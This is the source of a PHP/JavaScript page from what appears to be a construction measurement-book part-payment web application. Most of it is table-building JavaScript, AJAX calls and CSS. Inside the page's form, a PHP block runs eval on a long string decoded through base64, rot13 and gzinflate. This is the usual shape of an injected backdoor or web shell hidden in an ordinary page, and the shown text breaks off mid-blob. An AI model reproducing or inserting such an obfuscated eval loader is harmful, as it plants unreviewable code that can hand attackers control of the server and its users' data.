							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayableSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = measurementbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm";
							txt_box2.id = "txt_item_rate_slm"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm";
							txt_box3.id = "txt_partpay_percent_slm"+index;
							txt_box3.value = percent;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str"+itemid).value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "*" + DpmRemarks;
		//alert(itemStr);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		
	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
	jQuery(function ($) 
	{
	// Load dialog on click
		$('input[name="check"]').click(function (e) 
		{
			if($(this).is(':checked'))
			{
				// THIS PART IS FOR SINCE LAST MEASUREMENT SECTION //
				var SlmTotalAmount = 0, DpmPayableAmount = 0;
				var itemdetails = this.value;
				var split_itemdetails = itemdetails.split("*");
				var subdivid 	= split_itemdetails[0];
				var subdivname 	= split_itemdetails[1];
				var description = split_itemdetails[2];
				var slm_qty		= Number(split_itemdetails[3]);
				var dpm_qty		= Number(split_itemdetails[4]);
				var rate 		= Number(split_itemdetails[5]); 
				var itemunit	= split_itemdetails[6];
				var sheetid		= split_itemdetails[7];
					document.getElementById("txt_item_no").value = subdivname;
					document.getElementById("txt_item_id").value = subdivid;
					document.getElementById("txt_item_desc").value = description;
					document.getElementById("txt_slm_qty").value = slm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_dpm_qty").value = dpm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_item_rate_slm0").value = rate.toFixed(2);
					document.getElementById("hid_slm_qty").value = slm_qty.toFixed(3);
					//var tablerow;
					//tablerow = "<tr><td>"+subdivname+"</td><td>"+description+"</td></tr>";
					//$('#table2 tr:last').after(tablerow);
					
				// THIS PART IS FOR DEDUCT PREVIOUS MEASUREMENT SECTION //
				getDPMdetaiils(sheetid,subdivid,rate);
				getSLMdetaiils(sheetid,subdivid,rate);
				
				//SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
				//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//alert(SlmTotalAmount);
				//alert(DpmPayableAmount);
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
				
				$('#basic-modal-content').modal();
				
			}
			//return false;
		});
		
		$('#btn_save').click(function (e) 
		{
			if($('#table2 tr').size()>1)
			{
				//$('#table2 tr:last-child').remove();
				var temp = 1;
			}
			/*if(temp == 1)
			{
				$.modal.close();
				}*/
			
		});
		
	});
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="#212F3C" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="1087px" height="56px" align="center" class='label' bgcolor="#046CA8">
	<tr bgcolor="#046CA8" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:14px;" width="1077px"  height="48px" class="" align="center">ABSTRACT MBOOK - HISTORY</td>
	</tr>
</table>
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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